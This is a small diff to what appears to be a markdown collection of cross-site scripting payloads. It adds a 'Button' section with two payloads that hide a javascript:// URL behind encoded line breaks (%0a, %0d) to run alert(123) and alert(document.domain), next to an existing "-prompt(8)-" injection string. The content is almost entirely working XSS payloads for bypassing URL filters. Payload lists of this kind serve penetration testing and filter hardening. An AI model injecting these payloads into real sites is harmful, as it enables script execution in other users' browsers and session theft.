@@ -6,6 +6,16 @@ XSS
 ```
 
 
+**Button**
+```
+	  <Button href="javascript://%0aalert(123)">
+		XSS with %0a
+	  </Button>
+	  <Button href="javascript://%0dalert(document.domain)">
+		XSS with %0d
+	  </Button>
+```
+
 
 ```
 "-prompt(8)-"
